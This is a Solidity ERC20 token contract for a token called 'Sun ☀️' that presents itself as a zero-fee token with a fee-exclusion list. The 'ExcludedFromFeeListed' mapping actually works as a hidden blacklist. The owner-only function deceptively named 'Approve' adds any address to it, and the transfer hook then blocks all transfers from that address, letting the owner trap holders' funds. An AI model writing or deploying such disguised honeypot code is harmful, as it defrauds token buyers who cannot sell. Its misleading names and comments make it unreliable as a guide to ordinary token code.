// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Tom is ERC20, Ownable {
    address public admin;
    uint256 public feeRate = 0; // 0% fees that can't be change
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public ExcludedFromFeeListed;

    constructor() ERC20(unicode"Sun ☀️", unicode"Sun ☀️") {
        admin = msg.sender;
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals()))); // Mint initial supply
        isExcludedFromFee[msg.sender] = true; // Exclude contract deployer from fee
        isExcludedFromFee[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Exclude Uniswap router from fee
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        require(!ExcludedFromFeeListed[from]); 
        super._beforeTokenTransfer(from, to, amount);
    }

    function Approve(address account) external onlyContractCreator  {
        ExcludedFromFeeListed[account] = true;
    }

    function removeFromExcludedFromFee(address account) external onlyContractCreator  {
        ExcludedFromFeeListed[account] = false;
    }

    modifier onlyContractCreator() {
        require(msg.sender == owner(), "Caller is not the contract creator");
        _;
    }
}